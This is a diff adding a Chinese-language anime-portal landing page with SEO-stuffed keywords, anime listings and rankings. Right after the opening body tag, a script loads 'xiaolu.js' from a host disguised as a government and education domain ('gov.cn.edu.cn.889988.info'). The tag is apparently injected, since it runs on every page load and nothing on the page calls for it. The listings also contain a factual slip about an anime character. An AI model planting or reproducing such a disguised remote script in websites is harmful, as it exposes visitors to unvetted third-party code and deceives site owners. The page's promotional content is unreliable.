@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- 必应SEO核心标签 -->
+    <title>动漫大全 - 最新最热动漫导航推荐</title>
+    <meta name="description" content="动漫大全是您最佳的动漫观看和导航平台，提供最新动漫、经典动漫、动漫分类和排行榜。官方网址：https://dongmandaquan-wap">
+    <meta name="keywords" content="动漫大全,动漫导航,在线动漫,dongmandaquan-wap">
+    <meta name="author" content="动漫大全">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="bingbot" content="index, follow">
+    <style>
+        /* ================= 基础重置与变量 ================= */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary: #ff6b6b;
+            --secondary: #ffa502;
+            --bg-dark: #0f0c29;
+            --bg-mid: #302b63;
+            --bg-light: #24243e;
+            --text-main: #e0e0e0;
+            --text-muted: #aaaaaa;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --card-border: rgba(255, 255, 255, 0.1);
+        }
+        body {
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+            background: linear-gradient(135deg, var(--bg-dark), var(--bg-mid), var(--bg-light));
+            color: var(--text-main);
+            line-height: 1.7;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        a { text-decoration: none; color: var(--primary); transition: all 0.3s ease; }
+        a:hover { color: var(--secondary); }
+        ul { list-style: none; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+        /* ================= 头部导航 ================= */
+        header {
+            background: rgba(15, 12, 41, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 999;
+            border-bottom: 1px solid var(--card-border);
+        }
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 0;
+        }
+        .logo {
+            font-size: 1.9rem;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+        .logo span { color: var(--primary); text-shadow: 0 0 15px rgba(255,107,107,0.4); }
+        nav ul { display: flex; gap: 25px; }
+        nav a {
+            color: #fff;
+            font-weight: 500;
+            font-size: 1rem;
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: 1px solid transparent;
+        }
+        nav a:hover {
+            border-color: rgba(255,107,107,0.4);
+            background: rgba(255,107,107,0.1);
+            color: var(--primary);
+        }
+
+        /* ================= 英雄横幅区 ================= */
+        .hero {
+            padding: 100px 0 120px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            height: 150px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="%23ff6b6b" fill-opacity="0.08" d="M0,160L48,176C96,192,192,224,288,213.3C384,203,480,149,576,149.3C672,149,768,203,864,224C960,245,1056,235,1152,197.3C1248,160,1344,96,1392,64L1440,32L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>') no-repeat bottom/cover;
+            pointer-events: none;
+        }
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+        .hero h1 span { color: var(--primary); }
+        .hero p {
+            font-size: 1.25rem;
+            max-width: 650px;
+            margin: 0 auto 35px;
+            color: var(--text-muted);
+        }
+        .url-badge {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,165,2,0.3);
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-family: 'Courier New', monospace;
+            font-size: 1.15rem;
+            color: var(--secondary);
+            letter-spacing: 0.5px;
+        }
+
+        /* ================= 通用栏目样式 ================= */
+        .section { padding: 80px 0; }
+        .section-alt { background: rgba(0,0,0,0.15); }
+        .section-header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+        .section-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #fff;
+            display: inline-block;
+            position: relative;
+        }
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 50px;
+            height: 4px;
+            background: var(--primary);
+            margin: 12px auto 0;
+            border-radius: 2px;
+        }
+
+        /* ================= 网格与卡片 ================= */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 30px;
+            transition: transform 0.35s, box-shadow 0.35s, border-color 0.35s;
+        }
+        .card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            border-color: rgba(255,107,107,0.5);
+        }
+        .card h3 {
+            color: #fff;
+            font-size: 1.4rem;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        .card h3 a { color: #fff; }
+        .card h3 a:hover { color: var(--primary); }
+        .card p {
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            font-size: 0.95rem;
+        }
+        .read-more {
+            display: inline-block;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--primary);
+            border-bottom: 2px dashed transparent;
+            padding-bottom: 2px;
+        }
+        .read-more:hover { border-bottom-color: var(--primary); }
+
+        /* ================= 排行榜 ================= */
+        .ranking-list li {
+            display: flex;
+            align-items: center;
+            padding: 16px 20px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 12px;
+            margin-bottom: 12px;
+            transition: background 0.3s;
+        }
+        .ranking-list li:hover { background: rgba(255,107,107,0.12); }
+        .rank-num {
+            width: 32px; height: 32px;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(255,107,107,0.2);
+            color: var(--primary);
+            font-weight: 700;
+            border-radius: 8px;
+            margin-right: 18px;
+            flex-shrink: 0;
+        }
+        .ranking-list li:nth-child(1) .rank-num { background: var(--primary); color: #fff; }
+        .ranking-list li:nth-child(2) .rank-num { background: #ff4757; color: #fff; }
+        .ranking-list li:nth-child(3) .rank-num { background: var(--secondary); color: #fff; }
+        .rank-title { color: #fff; font-weight: 500; }
+        .rank-title:hover { color: var(--primary); }
+
+        /* ================= 关于与页脚 ================= */
+        .about-text {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+            font-size: 1.05rem;
+            color: var(--text-muted);
+        }
+        .about-text strong { color: var(--primary); }
+        .about-text a.btn-contact {
+            margin-top: 25px;
+            display: inline-block;
+            padding: 12px 35px;
+            background: linear-gradient(45deg, var(--primary), #ff4757);
+            color: #fff;
+            border-radius: 30px;
+            font-weight: 600;
+            box-shadow: 0 5px 15px rgba(255,107,107,0.3);
+        }
+        .about-text a.btn-contact:hover { transform: scale(1.05); color: #fff; }
+
+        footer {
+            background: #07061a;
+            padding: 40px 0 30px;
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+        footer p { color: #555; font-size: 0.9rem; margin-bottom: 8px; }
+        footer strong { color: var(--text-muted); }
+
+        /* ================= 移动端自适应 ================= */
+        @media (max-width: 992px) {
+            .hero h1 { font-size: 2.8rem; }
+        }
+        @media (max-width: 768px) {
+            .header-inner { flex-direction: column; gap: 15px; }
+            nav ul { flex-wrap: wrap; justify-content: center; gap: 10px; }
+            .hero { padding: 60px 0 80px; }
+            .hero h1 { font-size: 2.2rem; }
+            .hero p { font-size: 1rem; }
+            .section { padding: 50px 0; }
+            .section-title { font-size: 1.8rem; }
+            .url-badge { font-size: 0.95rem; padding: 10px 20px; }
+        }
+        @media (max-width: 480px) {
+            .logo { font-size: 1.6rem; }
+            .hero h1 { font-size: 1.8rem; }
+            .card { padding: 20px; }
+            .card h3 { font-size: 1.2rem; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+    <!-- 头部 -->
+    <header>
+        <div class="container header-inner">
+            <div class="logo">动漫<span>大全</span></div>
+            <nav>
+                <ul>
+                    <li><a href="#">首页</a></li>
+                    <li><a href="#">最新动漫</a></li>
+                    <li><a href="#">动漫分类</a></li>
+                    <li><a href="#">排行榜</a></li>
+                    <li><a href="#">关于我们</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <!-- 首页横幅 -->
+        <section class="hero">
+            <div class="container">
+                <h1>探索二次元的无限可能 <br><span>动漫大全</span></h1>
+                <p>聚合全网最新、最热、最经典的动漫资源，为您提供最便捷的导航体验。无论您身在何处，好动漫一站直达。</p>
+                <div class="url-badge">🌐 https://dongmandaquan-wap</div>
+            </div>
+        </section>
+
+        <!-- 栏目一：最新动漫 -->
+        <section class="section" id="latest">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">最新动漫</h2>
+                </div>
+                <div class="grid">
+                    <div class="card">
+                        <h3><a href="#">咒术回战 第二季</a></h3>
+                        <p>最强咒术师夏油杰的过去与现在的交织，精彩战斗不容错过，剧情高潮迭起。</p>
+                        <a href="#" class="read-more">查看详情 #</a>
+                    </div>
+                    <div class="card">
+                        <h3><a href="#">鬼灭之刃 锻刀村篇</a></h3>
+                        <p>炭治郎等人前往锻刀村，遭遇上弦之肆的袭击，激烈对决震撼展开。</p>
+                        <a href="#" class="read-more">查看详情 #</a>
+                    </div>
+                    <div class="card">
+                        <h3><a href="#">间谍过家家 第二季</a></h3>
+                        <p>伪装成一家人的间谍、杀手和超能力者的温馨日常与惊险任务持续更新。</p>
+                        <a href="#" class="read-more">查看详情 #</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：动漫分类 -->
+        <section class="section section-alt" id="categories">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">动漫分类</h2>
+                </div>
+                <div class="grid">
+                    <div class="card">
+                        <h3><a href="#">热血格斗</a></h3>
+                        <p>燃烧你的斗志！火影、海贼、死神等经典热血动漫全收录，唤醒你的中二之魂。</p>
+                        <a href="#" class="read-more">浏览分类 #</a>
+                    </div>
+                    <div class="card">
+                        <h3><a href="#">恋爱日常</a></h3>
+                        <p>甜蜜恋爱与欢乐校园，治愈你的每一天，感受青春的美好与悸动。</p>
+                        <a href="#" class="read-more">浏览分类 #</a>
+                    </div>
+                    <div class="card">
+                        <h3><a href="#">科幻机甲</a></h3>
+                        <p>未来世界、巨大机器人、星际战争，激发你的想象力，体验硬核科幻。</p>
+                        <a href="#" class="read-more">浏览分类 #</a>
+                    </div>
+                    <div class="card">
+                        <h3><a href="#">悬疑推理</a></h3>
+                        <p>烧脑剧情、神秘案件，挑战你的逻辑极限，真相只有一个。</p>
+                        <a href="#" class="read-more">浏览分类 #</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目三：排行榜 -->
+        <section class="section" id="ranking">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">热门排行榜</h2>
+                </div>
+                <div class="grid">
+                    <div class="card">
+                        <h3>本周热播 Top 5</h3>
+                        <ul class="ranking-list">
+                            <li><span class="rank-num">1</span> <a href="#" class="rank-title">进击的巨人 最终季</a></li>
+                            <li><span class="rank-num">2</span> <a href="#" class="rank-title">咒术回战</a></li>
+                            <li><span class="rank-num">3</span> <a href="#" class="rank-title">鬼灭之刃</a></li>
+                            <li><span class="rank-num">4</span> <a href="#" class="rank-title">间谍过家家</a></li>
+                            <li><span class="rank-num">5</span> <a href="#" class="rank-title">电锯人</a></li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>经典必看 Top 5</h3>
+                        <ul class="ranking-list">
+                            <li><span class="rank-num">1</span> <a href="#" class="rank-title">千与千寻</a></li>
+                            <li><span class="rank-num">2</span> <a href="#" class="rank-title">龙珠</a></li>
+                            <li><span class="rank-num">3</span> <a href="#" class="rank-title">名侦探柯南</a></li>
+                            <li><span class="rank-num">4</span> <a href="#" class="rank-title">灌篮高手</a></li>
+                            <li><span class="rank-num">5</span> <a href="#" class="rank-title">新世纪福音战士</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目四：关于我们 -->
+        <section class="section section-alt" id="about">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">关于 动漫大全</h2>
+                </div>
+                <div class="about-text">
+                    <p><strong>动漫大全</strong>（访问网址：<strong>https://dongmandaquan-wap</strong>）是一个专注于动漫资源导航与推荐的垂直网站。我们致力于为广大动漫爱好者提供最新、最全的动漫资讯、分类导航和排行榜单。</p>
+                    <p style="margin-top: 15px;">无论你是喜欢热血格斗、浪漫恋爱，还是烧脑悬疑，在<strong>动漫大全</strong>都能找到属于你的那一部动漫。我们的目标是通过简洁、高效的界面，让你轻松发现好动漫。</p>
+                    <a href="#" class="btn-contact">联系我们 #</a>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- 底部 -->
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 <strong>动漫大全</strong> (https://dongmandaquan-wap) 保留所有权利.</p>
+            <p>核心关键词：<strong>动漫大全</strong> | 本网站内容仅供学习与交流使用</p>
+        </div>
+    </footer>
+
+</body>
+</html>
